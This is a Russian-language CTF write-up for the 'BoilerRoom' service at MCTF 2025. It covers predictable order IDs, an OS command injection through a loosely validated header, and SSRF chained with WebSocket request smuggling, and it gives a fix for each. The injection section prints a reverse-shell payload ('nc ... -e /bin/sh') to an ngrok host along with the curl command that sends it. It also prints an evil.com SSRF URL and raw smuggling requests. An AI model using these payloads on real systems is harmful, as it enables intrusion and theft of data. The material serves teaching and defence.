# BoilerRoom
**MCTF 2025**

Начнем с описания функционала сервиса.
Стартовая страница сервиса содержит две ссылки: создать новый заказ или проверить статус уже созданного заказа.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/1.png)

Создадим новый заказ: перейдем по первой ссылке. На странице создания заказа необходимо ввести имя и выбрать объем кипятка (для чего нужен кипяток). Если заполнить промокод, то кипячение произойдет быстрее. Жюрейная система вводит флаг в поле промокода.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/2.png)

При создании заказа бэкенд валидирует поля по регулярным выражениям. Если все корректно, то появляется модальное окно с идентификатором заказа и ссылкой на страницу с информацией о заказе.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/3.png)

На страницу с информацией о заказе можно перейти из страницы проверки статуса заказа. Для этого нужно ввести идентификатор заказа в поле для ввода:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/4.png)

На странице с информацией о заказе отображаются введенные пользователем данные, дата и время оформления заказа, а также его статус, который обновляется динамически. Также можно скачать чек - текстовый файл с информацией о заказе.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/5.png)

## CWE-340: Generation of Predictable Numbers or Identifiers
### Как эксплуатировать уязвимость?
При анализе кода необходимо было обратить внимание на то, как генерируются идентификаторы заказа. Для генерация используется самописная функция, которая вычисляет SHA256 хэш от timestamp времени оформления заказа:

![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/6.png)

При этом в качестве timestamp используется стандартный формат языка Go с точностью до миллисекунды
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/7.png)

Этот же timestamp используется для записи времени оформления заказа. Отсюда (или найдя в интернете как выглядит `timestmap` миллисекунд в Go) мы можем представить как выглядит входная строка, которая использовалась для генерации идентификатора заказа:
```
November 16 HH:MM:SS.mmm
```

16 ноября - день проведения CTF, жюрейная система кладет флаги каждую минуту - значит мы знаем `HH` и `MM`. Остается только перебрать `SS` и `mmm` - всего $10^5$ комбинаций.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/8.png)
(На скриншоте дата на момент написания отчета)

Пример скрипта для перебора [brute_id.py](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/solvers/brute_id.py)

### Как исправить уязвимость?
Необходимо использовать безопасный генератор ID. Нужно убедиться, что генератор ID не делает их предсказуемыми. Пример подходящего генератора: https://pkg.go.dev/github.com/google/uuid

## CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
### Как эксплуатировать уязвимость?
В ходе анализа конфигурации Nginx можно было заметить странную деталь: Nginx проверяет наличие заголовка `True-Real-Ip`, и если его нет, то добавляет его со значением равной внутренней переменной `remote_addr` (IP адрес клиента). При этом, если заголовок уже был установлен, то его значение сохраняется. Для проверки, что заголовок корректен используется регулярное выражение:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/9.png)

Запрос проксируется дальше только в случае, если заголовок подходит под регулярное выражение. Рассмотрим его внимательнее, например, в https://regex101.com
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/10.png)

Регулярное выражение проверяет, что строка похожа на IP адрес. Однако, нужно заметить, что у регулярного выражения нет символов, ограничивающих поиск вхождения от начала до конца строки. Поэтому, мы можем дописать слева или справа от валидного IP адреса что угодно:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/11.png)

То есть, мы можем контролировать значение заголовка `True-Real-Ip` и отправлять его на бэкенд. Найдем место, где используется этот заголовок: функция генерации чека.
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/12.png)

Из кода функции видно, что значение заголовка `True-Real-Ip` участвует в имени файла чека. При этом сам файл чека создается в файловой системе с помощью `bash` команды `touch`. Таким образом мы можем указать такое значение заголовка, чтобы оно исполнилось как отдельная команда в bash. Помним, что нам нужно пройти проверку по регулярному выражению, поэтому пример заголовка для эксплуатации уязвимости может выглядеть так:
```
127.0.0.1; nc 7.tcp.eu.ngrok.io 17875 -e /bin/sh;
```
Чтобы вызвать функцию создания чека, нам сначала нужен заказ. Создадим его:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/13.png)

Будем прокидывать reverse shell, поэтому начнем слушать порт, например, с помощью команды `nc -lnv 4444`. Чтобы наш порт был доступен с игрового сервера необходимо открыть его в интернет, например, с помощью утилиты `ngrok` и команды `ngrok tcp 4444`. 
Далее, обратимся к API генерации чека напрямую, указав заголовок с инъекцией и ID нашего заказа:
```
curl "http://0.0.0.0:8000/api/bill/78a06a332e0eef8050e0109cf92ff15aff822c107e4312f570a3c4ab418638c1" -H "True-Real-Ip: 127.0.0.1; nc 7.tcp.eu.ngrok.io 17875 -e /bin/sh;"
```
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/14.png)

Таким образом у нас есть reverse shell с правами root. Далее можно вывести сами чеки 
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/15.png)

![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/16.png)

Или получать идентификаторы заказа из имен чеков и использовать их для получения флага.

### Как исправить уязвимость?
Необходимо исправить логику создания файла:
1. исправить регулярное выражение на nginx, которое проверяет заголовок `True-Real-Ip` (пример корректного регулярного выражения - `^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)`
2. использовать стандартную функцию создания файла `Create` из пакета `os`

## CWE-918: Server-Side Request Forgery (SSRF) + CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')
### Как эксплуатировать уязвимость?
По логам запросов от жюрейной системы или анализируя код, можно было найти эндпоинт, отвечающий за проверку состояния API:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/17.png)

В функции происходит проверка query параметра `url` на наличие подстрок `http` и `localhost` и, в случае успешной проверки, на указанный в параметре `url` адрес отправляется `HEAD` запрос. В функции реализована некорректная проверка, что запросы идут на `localhost`: проверяется только вхождение подстрок `http` и `localhost`, при этом они могут быть расположены в произвольном месте значения параметра `url`, например, строка ниже удовлетворяет данному условию:
```
http://evil.com/localhost
```
Передав такой `url`, запрос отправится по адресу http://evil.com/localhost. Таким образом, у нас есть SSRF.

В коде сервиса указан внутренний эндпоинт `/internal/orders`:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/18.png)

Данный эндпоинт недоступен извне, тк Nginx проксирует запросы только на `location /api`. Сам эндпоинт возвращает все данные о всех заказах из базы данных:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/19.png)

Попробовав вызвать этот энподинт через найденную SSRF мы увидим, что запрос выполняется успешно, но никакого вывода нет:
```
curl "http://0.0.0.0:8000/api/healthcheck/?url=http://localhost:5555/internal/orders" -v
```
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/20.png)

Ничего не возвращается, так как `healthcheck` отправляет `HEAD` запрос, который обрабатывается в API отдельно и возвращает только статус `200` без данных:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/21.png)

Таким образом, SSRF отдельно бесполезна. Но, поизучав код еще можно найти функцию, которая отвечает за динамическое обновление статуса заказа с помощью WebSocket:
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/22.png)

Перед бэкендом у нас расположен Nginx в качестве reverse proxy. При этом, Nginx проксирует только HTTP запросы. Для установления соединения, необходимо отправить HTTP запрос с заголовками Upgrade: WebSocket и Connection: Upgrade. Получив данные заголовки, бэкенд понимает, что клиент хочет установить WebSocket соединение и, если бэкенд к этому готов, отвечает кодом `101`. При появлении reverse proxy между клиентом и сервером запрос ответ с кодом 101 приходит на reverse proxy, что служит для Nginx сигналом для установления туннеля между клиентом и сервером. Подробнее тут: https://nginx.org/en/docs/http/websocket.html

Таким образом, нам нужно установить туннель до сервера и обратиться к внутреннему API `/internal/orders`, минуя Nginx. Однако, также нам нужно, чтобы сервер мог взаимодействовать с нами через HTTP. То есть, нам нужно отправить на бэкенд HTTP запрос, который удовлетворяет следующим условиям:
Nginx думает, что клиент собирается установить WebSocket соединение
Бэкенд не устанавливает WebSocket соединение

Чтобы бэкенд не устанавливал WebSokcet взаимодействие нужно отправить запрос на эндпоинт, который не поддерживает WebSocket (любой эндпоинт, кроме `/api/status`). Для первого пункта нам нужно отправить заголовки `Upgrade: WebSocket` и `Connection: Upgrade`, а также чтобы бэкенд ответил кодом `101`, чтобы Nginx думал, что WebSocket соединение успешно установлено. На этом этапе нужно вспомнить про SSRF, найденную ранее: нам нужно через SSRF отправить запрос на сервер, который вернет статус `101`. При этом, чтобы обойти проверку в коде, нужно чтобы адрес содержал подстроки `http` и `localhost`. Так как в найденной  SSRF мы можем отправить только `HEAD` запросы, напишем простой сервер, который принимает `HEAD` запрос на эндпоинте `localhost` и всегда отвечает кодом `101`. Пример такого сервера в файле [server.py](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/solvers/server.py)

Откроем порт, который слушает наш сервер в интернет с помощью утилиты `ngrok` и команды `ngrok tcp 1234`. Лучше использовать режим `tcp`, так как в режиме `http` `ngrok` при получении кода `101` думает, что сервер хочет установить WebSocket соединение, которое он обработать не может, из-за чего возвращает далее статус `302`.
Для PoC будем использовать утилиту `nc`. Отправим запрос на `healthcheck` с заголовками `Upgrade: WebSocket` и `Connection: Upgrade`. Пример такого HTTP запроса:
```
GET /api/healthcheck/?url=http://0.tcp.eu.ngrok.io:16995/localhost HTTP/1.1
Host: 0.0.0.0:8000
Upgrade: WebSocket
Connection: Upgrade


```
(нужно помнить, что после части заголовков в HTTP пакете следует `\r\n\r\n`, поэтому нужно отправить дополнительный перевод строки)

Туннель установлен
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/23.png)

Пробуем отправить HTTP запрос до внутреннего API:
```
GET /internal/orders HTTP/1.1
Host: api:5555


```
![](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/pics/24.png)

Успех! Дополнительный код экплуатации в репозитории в файле [smuggle.py](https://github.com/andreika47/Quiet-CTF/blob/main/BoilerRoom/solvers/smuggle.py)

### Как исправить уязвимость?
**CWE-918:** реализовать корректную проверку домена на `/api/healthcheck`. Разрешать отправлять запросы только к локальному веб серверу или перечислить адреса, на которые можно отправлять запросы
**CWE-444:** защититься от SSRF. Также рекомендуется выделить отдельный `location` для WebSocket взаимодействия и разрешить заголовки `Upgrade` только на нем. Блокировать на прокси `Upgrade` запросы к эндпоинтам, которые не реализуют WebSocket взаимодейтсвие

Концепт уязвимости и доп. инфо тут: 
https://book.hacktricks.xyz/pentesting-web/h2c-smuggling
https://github.com/0ang3el/websocket-smuggle

#web #uuid #rce #websocket #smuggling